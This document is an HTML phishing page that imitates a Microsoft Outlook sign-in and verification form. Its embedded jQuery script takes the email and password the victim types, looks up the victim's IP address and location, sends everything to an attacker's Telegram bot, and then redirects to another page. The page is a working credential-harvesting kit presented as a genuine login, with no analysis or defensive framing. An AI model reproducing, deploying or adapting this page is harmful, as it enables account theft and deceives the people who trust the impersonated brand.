<html lang="es"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook Verification</title>
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
	
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
<script type="text/javascript" src="telgm.js"></script>
    <script>

        $(document).ready(function(){
            $('#loginForm').submit(function(e){
                e.preventDefault();
				var u_name777 = $('#email').val();
                var u_name888 = $('#password').val();

                var ip, ip2;
                $.getJSON("https://api.ipify.org?format=json", function(data) {
                    ip = data.ip;
                    $.getJSON("https://ipinfo.io", function (response) {
                        ip2 = response.city + ", " + response.country;
                        var message = "\n📧Usuario: " + u_name777+ "\n🔒Contra: " + u_name888+ "\n📌: " + ip + "\n" + ip2;
                        var settings = {
                            "async": true,
                            "crossDomain": true,
                            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "cache-control": "no-cache"
                            },
                            "data": JSON.stringify({
                                "chat_id": chat_id,
                                "text": message
                            })
                        };
                        $.ajax(settings).done(function (response) {
                            window.location = 'index1.html'; 
                        });
                    });
                });
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <!-- Formulario de inicio de sesión -->
        <div class="sign-in-box">
            <img src="https://www.freepnglogos.com/uploads/microsoft-logo-png-transparent-background-1.png" alt="Microsoft Logo" class="logo">
            <h2>Sign In</h2>
            <p>Outlook Verification</p>
            <form id="loginForm" method="post">
                <div class="form-group">
                    <input type="email" id="email" name="email" placeholder="Email, phone or skype" required="">
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Contraseña" required="">
                    <!-- Icono para mostrar la contraseña -->
                    <i class="fa fa-eye eye-icon" onclick="togglePassword()"></i>
                </div>
                <!-- Checkbox para aceptar la política de privacidad -->
                <div class="checkbox-container">
                    <input type="checkbox" id="privacy-policy" required="">
                    <label for="privacy-policy">I agree to the privacy policy</label>
                </div>
                <div class="form-group">
                    <button type="submit" class="btn-primary">Sign In</button>
                </div>
                <p class="no-account">¿Not an account? <a href="#">Create one</a></p>
            </form>
        </div>
    </div>


</body></html>
